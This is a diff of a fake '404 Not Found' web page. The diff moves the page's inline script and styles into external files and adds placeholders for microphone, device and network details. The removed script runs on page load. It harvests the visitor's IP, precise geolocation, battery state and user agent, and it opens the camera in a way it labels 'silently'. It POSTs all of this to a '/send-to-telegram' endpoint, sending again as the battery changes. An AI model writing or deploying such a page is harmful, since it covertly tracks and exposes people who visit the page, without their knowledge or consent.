@@ -4,59 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>404 Not Found</title>
-  <style>
-    body {
-      font-family: 'Arial', sans-serif;
-      background-color: #121212;
-      color: #e0e0e0;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      text-align: center;
-    }
-    .container {
-      max-width: 600px;
-      padding: 2rem;
-      border-radius: 8px;
-      background-color: #1e1e1e;
-      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
-    }
-    h1 {
-      font-size: 3rem;
-      margin-bottom: 1rem;
-      color: #ff5555;
-    }
-    p {
-      font-size: 1.2rem;
-      margin-bottom: 2rem;
-    }
-    a {
-      color: #4dabf7;
-      text-decoration: none;
-    }
-    a:hover {
-      text-decoration: underline;
-    }
-    .info {
-      margin-top: 2rem;
-      padding: 1rem;
-      background-color: #2d2d2d;
-      border-radius: 4px;
-      font-family: monospace;
-      text-align: left;
-      display: none;
-    }
-    #map-link {
-      margin-top: 1rem;
-      display: inline-block;
-    }
-    #battery-info {
-      margin-top: 0.5rem;
-    }
-  </style>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
   <div class="container">
@@ -69,154 +17,14 @@
       <div id="location-info">Location: Loading...</div>
       <a id="map-link" target="_blank" style="display:none;">View on Maps</a>
       <div id="battery-info">Battery: Loading...</div>
-      <div id="camera-info">Camera: Not accessed</div>
+      <div id="camera-info">Camera: Checking...</div>
+      <div id="microphone-info">Microphone: Checking...</div>
       <div id="ip-info">IP: Loading...</div>
+      <div id="device-details">Device Details: Loading...</div>
+      <div id="network-info">Network: Loading...</div>
     </div>
   </div>
 
-  <script>
-    document.addEventListener('DOMContentLoaded', async function() {
-      const deviceInfo = {
-        userAgent: navigator.userAgent,
-        ip: await fetchIP(),
-        location: null,
-        battery: null,
-        cameraAccess: false
-      };
-
-      // Show device info section
-      document.getElementById('device-info').style.display = 'block';
-
-      // Get battery information
-      if ('getBattery' in navigator) {
-        navigator.getBattery().then(battery => {
-          deviceInfo.battery = {
-            level: battery.level,
-            charging: battery.charging
-          };
-          updateBatteryInfo(battery);
-          
-          battery.addEventListener('levelchange', () => {
-            deviceInfo.battery.level = battery.level;
-            updateBatteryInfo(battery);
-            sendDataToTelegram(deviceInfo);
-          });
-          
-          battery.addEventListener('chargingchange', () => {
-            deviceInfo.battery.charging = battery.charging;
-            updateBatteryInfo(battery);
-            sendDataToTelegram(deviceInfo);
-          });
-        });
-      } else {
-        document.getElementById('battery-info').textContent = 'Battery: API not supported';
-      }
-
-      // Get location information
-      if ('geolocation' in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          position => {
-            deviceInfo.location = {
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude
-            };
-            updateLocationInfo(position.coords);
-            sendDataToTelegram(deviceInfo);
-            
-            // Try to access camera
-            accessCamera();
-          },
-          error => {
-            document.getElementById('location-info').textContent = 
-              `Location: ${error.message}`;
-            // Try to access camera even if location fails
-            accessCamera();
-          },
-          { enableHighAccuracy: true, timeout: 10000 }
-        );
-      } else {
-        document.getElementById('location-info').textContent = 'Location: Geolocation not supported';
-        // Try to access camera
-        accessCamera();
-      }
-
-      // Send initial data
-      sendDataToTelegram(deviceInfo);
-    });
-
-    async function fetchIP() {
-      try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        document.getElementById('ip-info').textContent = `IP: ${data.ip}`;
-        return data.ip;
-      } catch (error) {
-        document.getElementById('ip-info').textContent = 'IP: Could not fetch';
-        return null;
-      }
-    }
-
-    function updateLocationInfo(coords) {
-      document.getElementById('location-info').textContent = 
-        `Location: ${coords.latitude}, ${coords.longitude}`;
-      
-      const mapLink = document.getElementById('map-link');
-      mapLink.href = `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
-      mapLink.style.display = 'inline-block';
-      mapLink.textContent = 'View on Google Maps';
-    }
-
-    function updateBatteryInfo(battery) {
-      const levelPercent = Math.round(battery.level * 100);
-      const chargingStatus = battery.charging ? ' (charging)' : '';
-      document.getElementById('battery-info').textContent = 
-        `Battery: ${levelPercent}%${chargingStatus}`;
-    }
-
-    function accessCamera() {
-      if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
-        navigator.mediaDevices.getUserMedia({ video: true })
-          .then(stream => {
-            document.getElementById('camera-info').textContent = 'Camera: Accessed silently';
-            // Immediately stop the stream
-            stream.getTracks().forEach(track => track.stop());
-            // Update device info
-            const deviceInfo = {
-              userAgent: navigator.userAgent,
-              ip: document.getElementById('ip-info').textContent.replace('IP: ', ''),
-              location: document.getElementById('location-info').textContent.includes(',') ? {
-                latitude: parseFloat(document.getElementById('location-info').textContent.split(',')[0].split(':')[1].trim()),
-                longitude: parseFloat(document.getElementById('location-info').textContent.split(',')[1].trim())
-              } : null,
-              battery: document.getElementById('battery-info').textContent.includes('%') ? {
-                level: parseFloat(document.getElementById('battery-info').textContent.split('%')[0].split(':')[1].trim()) / 100,
-                charging: document.getElementById('battery-info').textContent.includes('charging')
-              } : null,
-              cameraAccess: true
-            };
-            sendDataToTelegram(deviceInfo);
-          })
-          .catch(error => {
-            document.getElementById('camera-info').textContent = `Camera: ${error.message}`;
-          });
-      } else {
-        document.getElementById('camera-info').textContent = 'Camera: API not supported';
-      }
-    }
-
-    async function sendDataToTelegram(deviceInfo) {
-      try {
-        await fetch('/send-to-telegram', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({ deviceInfo })
-        });
-      } catch (error) {
-        console.error('Error sending to Telegram:', error);
-      }
-    }
-  </script>
+  <script src="script.js"></script>
 </body>
 </html>
